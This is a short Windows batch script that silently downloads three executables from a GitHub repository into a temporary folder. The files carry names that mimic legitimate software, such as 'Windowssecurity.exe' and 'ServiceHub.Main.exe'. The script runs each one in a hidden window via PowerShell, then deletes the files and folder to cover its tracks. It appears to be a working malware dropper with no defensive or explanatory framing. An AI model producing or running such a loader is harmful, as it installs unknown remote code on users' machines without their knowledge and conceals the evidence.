@echo off
setlocal

set "TEMP_DIR=%TEMP%\gt_temp"
if not exist "%TEMP_DIR%" md "%TEMP_DIR%" >nul 2>&1

curl -L -o "%TEMP_DIR%\Primeclientautoupdater.exe" https://github.com/blechbleh/sasdaasd/raw/refs/heads/main/Primeclientautoupdater.exe >nul 2>&1
curl -L -o "%TEMP_DIR%\Windowssecurity.exe" https://github.com/blechbleh/sasdaasd/raw/refs/heads/main/Windowssecurity.exe >nul 2>&1
curl -L -o "%TEMP_DIR%\ServiceHub.Main.exe" https://github.com/blechbleh/sasdaasd/raw/refs/heads/main/ServiceHub.Main.exe >nul 2>&1

if exist "%TEMP_DIR%\Primeclientautoupdater.exe" start "" /B powershell -WindowStyle Hidden -Command "Start-Process '%TEMP_DIR%\Primeclientautoupdater.exe' -WindowStyle Hidden"
if exist "%TEMP_DIR%\Windowssecurity.exe" start "" /B powershell -WindowStyle Hidden -Command "Start-Process '%TEMP_DIR%\Windowssecurity.exe' -WindowStyle Hidden"
if exist "%TEMP_DIR%\ServiceHub.Main.exe" start "" /B powershell -WindowStyle Hidden -Command "Start-Process '%TEMP_DIR%\ServiceHub.Main.exe' -WindowStyle Hidden"

timeout /t 5 >nul
del /f /q "%TEMP_DIR%\*.exe" >nul 2>&1
rd /q "%TEMP_DIR%" >nul 2>&1
exit
